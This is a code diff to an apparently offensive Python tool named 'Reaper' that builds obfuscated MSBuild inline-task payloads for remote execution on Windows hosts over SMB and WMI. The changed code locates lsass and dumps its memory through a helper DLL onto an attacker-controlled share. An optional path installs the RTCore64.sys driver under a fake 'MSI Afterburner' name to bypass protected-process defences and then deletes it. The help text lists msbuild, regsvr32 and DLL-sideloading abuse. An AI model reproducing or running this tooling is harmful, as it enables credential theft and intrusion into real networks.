@@ -856,18 +856,7 @@ def gen_payload_regsvr32(share_name, payload_name, addresses_array):
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
-    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
+    minidumpdll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -904,69 +893,32 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "              <![CDATA[\n"
     xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
     xml_payload += "public class %s : Task, ITask {\n" % (taskname)
-    xml_payload += "		public enum Typ : uint\n"
-    xml_payload += "        {\n"
-    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
-    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
-    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
-    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
-    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
-    xml_payload += "        };\n"
+
+    xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"getthatdmp\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, minidumpdll)
+    xml_payload += "        static extern int getthatdmp(int pid, string output);\n"
+
     if runasppl:
         xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
         xml_payload += "        static extern void runninit(string argus);\n"
 
-    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
-    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
-    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
-    xml_payload += "              CharSet = CharSet.Unicode,\n"
-    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
-    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
-    xml_payload += "              IntPtr hProcess,\n"
-    xml_payload += "              uint processId,\n"
-    xml_payload += "              IntPtr hFile,\n"
-    xml_payload += "              uint dumpType,\n"
-    xml_payload += "              IntPtr expParam,\n"
-    xml_payload += "              IntPtr userStreamParam,\n"
-    xml_payload += "              IntPtr callbackParam);\n"
 
-    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
-    xml_payload += "        {\n"
-    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
-    xml_payload += "            {\n"
-    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
-    xml_payload += "                  %s,\n" % (prochandle)
-    xml_payload += "                  %s,\n" % (procid)
-    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
-    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
-    xml_payload += "                  IntPtr.Zero,\n"
-    xml_payload += "                  IntPtr.Zero,\n"
-    xml_payload += "                  IntPtr.Zero);\n"
-    xml_payload += "                if (!%s)\n" % (bRet)
-    xml_payload += "                {\n"
-    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
-    xml_payload += "                }\n"
-    xml_payload += "                return %s;\n" % (bRet)
-    xml_payload += "            }\n"
-    xml_payload += "        }\n"
+        xml_payload += "        public static int %s() {\n" % (GetMyPID)
+        xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
+        xml_payload += "            var %s = 0;\n" % (myid)
+        xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
+        xml_payload += "            {\n"
+        xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
+        xml_payload += "            }\n"
 
-    xml_payload += "        public static int %s() {\n" % (GetMyPID)
-    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
-    xml_payload += "            var %s = 0;\n" % (myid)
-    xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
-    xml_payload += "            {\n"
-    xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
-    xml_payload += "            }\n"
-
-    xml_payload += "            return %s;\n" % (myid)
-    xml_payload += "        }\n"
+        xml_payload += "            return %s;\n" % (myid)
+        xml_payload += "        }\n"
 
     xml_payload += "        public static int %s() {\n" % (GetPID)
     xml_payload += "            string %s = \"s\";\n" % (s)
     xml_payload += "            string %s = \"l\";\n" % (l)
     xml_payload += "            string %s = \"a\";\n" % (a)
-    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
-    xml_payload += "            var %s = 0;\n" % (id)
+    xml_payload += "            var %s = Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
+    xml_payload += "            int %s = 0;\n" % (id)
     xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
     xml_payload += "            {\n"
     xml_payload += "                %s = %s.Id;\n" % (id, process)
@@ -998,6 +950,7 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
     xml_payload += "                        }\n"
     xml_payload += "                    }\n"
     xml_payload += "                }\n"
+
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
         xml_payload += "                Thread.Sleep(1000);\n"
@@ -1007,8 +960,14 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         xml_payload += "                Thread.Sleep(1000);\n"
 
     xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
-    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
-    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
+    #xml_payload += "                int %s = Process.GetProcessById(%s());\n" % (p, GetPID)
+    xml_payload += "                int t = 0;\n"
+    xml_payload += "                var processes = Process.GetProcessesByName(\"lsass\");\n"
+    xml_payload += "                foreach(var p in processes)\n"
+    xml_payload += "                {\n"
+    xml_payload += "                    t = p.Id;\n"
+    xml_payload += "                }\n"
+    xml_payload += "                int returnedout = getthatdmp(t, filePath);\n"
     if runasppl:
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
         xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"
@@ -1029,6 +988,9 @@ def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array,
         for addr in addresses_array:
             f.write(addr + "\n")
         f.close()
+
+    os.system('sudo cp {}/src/minidump /var/tmp/{}/{}.dll'.format(cwd, share_name, minidumpdll))
+    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, minidumpdll))
 
     if runasppl:
         os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
@@ -1401,7 +1363,7 @@ if __name__ == '__main__':
         os.system('sudo rm {}/indivlog.txt'.format(cwd))
 
     printnlog(reaper_banner)
-    update_chk()
+    #update_chk()
     printnlog(version.BANNER)
 
     parser = argparse.ArgumentParser(add_help=True, description='', epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)
